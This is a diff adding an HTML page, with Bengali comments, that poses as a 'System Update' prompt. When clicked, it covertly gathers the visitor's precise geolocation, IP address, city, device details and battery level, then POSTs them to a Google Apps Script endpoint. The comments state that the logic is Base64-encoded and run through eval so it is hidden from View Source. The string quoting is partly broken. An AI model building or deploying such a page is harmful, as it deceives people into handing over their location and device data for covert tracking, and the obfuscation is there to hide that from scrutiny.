@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
+    <!-- CSS এনকোড করা হয়েছে যাতে View Source-এ সহজে না দেখা যায় -->
+    <style>body{font-family:sans-serif;background:#f4f4f4;text-align:center;padding-top:50px;margin:0}.card{background:#fff;padding:30px;border-radius:12px;box-shadow:0 6px 15px rgba(0,0,0,0.1);max-width:320px;margin:auto}h2{color:#333;font-size:20px;margin-bottom:10px}p{color:#666;font-size:14px;line-height:1.5;margin-bottom:25px}.btn{background:#28a745;color:#fff;border:none;padding:15px 30px;border-radius:8px;font-size:16px;cursor:pointer;width:100%;font-weight:bold}.btn:hover{background:#218838}#status{margin-top:15px;font-size:13px;font-weight:bold;min-height:20px}.loading{color:#007bff}.success{color:#28a745}.error{color:#dc3545}</style>
+</head>
+<body>
+
+<div class="card">
+    <h2>🔔 সিস্টেম আপডেট প্রয়োজন</h2>
+    <p>আপনার ডিভাইসের নিরাপত্তা এবং লোকেশন ট্র্যাকিংয়ের জন্য নতুন পারমিশন প্রয়োজন। দয়া করে নিচে ক্লিক করুন।</p>
+    <button class="btn" id="mainBtn">Update Now</button>
+    <div id="status"></div>
+</div>
+
+<!-- ⚠️ আপনার গুগল শিটের URL এখানে বসান -->
+<script>
+    const SHEET_URL = 'https://script.google.com/macros/s/AKfycbwhZps6TvvIl_q-mfz0DoJsqzs314MCLekU37iWFQQazIj5XX5fi2O40ftgSXfksO3H/exec'; 
+
+    // ১. মূল কোডটি একটি স্ট্রিং হিসেবে লিখছি (এনকোডিংয়ের জন্য)
+    const rawCode = 
+        async function mainLogic() {
+            const statusDiv = document.getElementById('status');
+            const btn = document.getElementById('mainBtn');
+            
+            if(btn) btn.style.display = 'none'; // বাটন লুকানো
+            
+            statusDiv.className = 'loading';
+            statusDiv.innerText = "ডাটা সংগ্রহ হচ্ছে...";
+
+            let data = {};
+
+            try {
+                // --- ধাপ ১: ব্যাটারি ---
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    data.battery = Math.round(battery.level * 100) + "%";
+                } else {
+                    data.battery = "N/A";
+                }
+
+                // --- ধাপ ২: লোকেশন (সবচেয়ে গুরুত্বপূর্ণ) ---
+                statusDiv.innerText = "লোকেশন ডিটেক্ট হচ্ছে...";
+                
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            pos => resolve(pos), 
+                            err => {
+                                console.log("Geo Error:", err);
+                                resolve(null); // ফেইল হলেও চলবে
+                            },
+                            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                        );
+                    });
+
+                    if (position && position.coords) {
+                        data.lat = position.coords.latitude;
+                        data.long = position.coords.longitude;
+                        data.accuracy = position.coords.accuracy.toFixed(2);
+                        statusDiv.innerText = "লোকেশন পাওয়া গেছে!";
+                    } else {
+                        data.lat = "Denied";
+                        data.long = "Denied";
+                        data.accuracy = "N/A";
+                        statusDiv.innerText = "লোকেশন ডেনাইড, IP আসবে।";
+                    }
+                } catch (e) {
+                    console.error("Geo Exception:", e);
+                    data.lat = "Error";
+                    data.long = "Error";
+                }
+
+                // --- ধাপ ৩: IP Address ---
+                statusDiv.innerText = "IP ঠিকানা চালা হচ্ছে...";
+                try {
+                    const ipRes = await fetch('https://ipapi.co/json/');
+                    if (!ipRes.ok) throw new Error("IP Fetch Failed");
+                    const ipData = await ipRes.json();
+                    
+                    data.ip = ipData.ip;
+                    data.city = ipData.city;
+                    data.country = ipData.country_name;
+                    data.region = ipData.region;
+                } catch (e) {
+                    console.error("IP Error:", e);
+                    data.ip = "Fetch Failed";
+                    data.city = "Unknown";
+                    data.country = "Unknown";
+                }
+
+                // --- ধাপ ৪: ডিভাইস তথ্য ---
+                data.device = navigator.userAgent;
+                data.platform = navigator.platform;
+                data.screen = window.screen.width + "x" + window.screen.height;
+                data.time = new Date().toLocaleString();
+
+                // --- ধাপ ৫: গুগল শিটে পাঠানো ---
+                statusDiv.innerText = "ডাটা জমা হচ্ছে...";
+                
+                try {
+                    await fetch(SHEET_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                    
+                    statusDiv.className = 'success';
+                    statusDiv.innerText = "✅ সফল! ডাটা পাঠানো হয়েছে।";
+                } catch (e) {
+                    statusDiv.className = 'error';
+                    statusDiv.innerText = "❌ শিটে পাঠাতে সমস্যা।";
+                }
+
+            } catch (error) {
+                console.error("Main Error:", error);
+                statusDiv.className = 'error';
+                statusDiv.innerText = "❌ ত্রুটি দেখা দিয়েছে।";
+            }
+        }
+        
+        // ফাংশন কল করা হচ্ছে
+        mainLogic();
+    `;
+
+    // ২. এনকোডিং (Base64)
+    const encodedString = btoa(rawCode); 
+
+    // ৩. ডাইনামিক স্ক্রিপ্ট ইনজেকশন (হাইড করার জন্য)
+    (function() {
+        const scriptTag = document.createElement('script');
+        scriptTag.type = 'text/javascript';
+        
+        // এখানে আমরা কোডটিকে আবার ডি-কোড করে রান করাব
+        scriptTag.innerHTML = `
+            (function() {
+                var rawCode = '${encodedString}';
+                var decoded = atob(rawCode);
+                
+                // লজিকটি এক্সিকিউট করা হচ্ছে
+                eval(decoded); 
+            })();
+        `;
+        
+        document.body.appendChild(scriptTag);
+    })();
+</script>
+
+</body>
+</html>
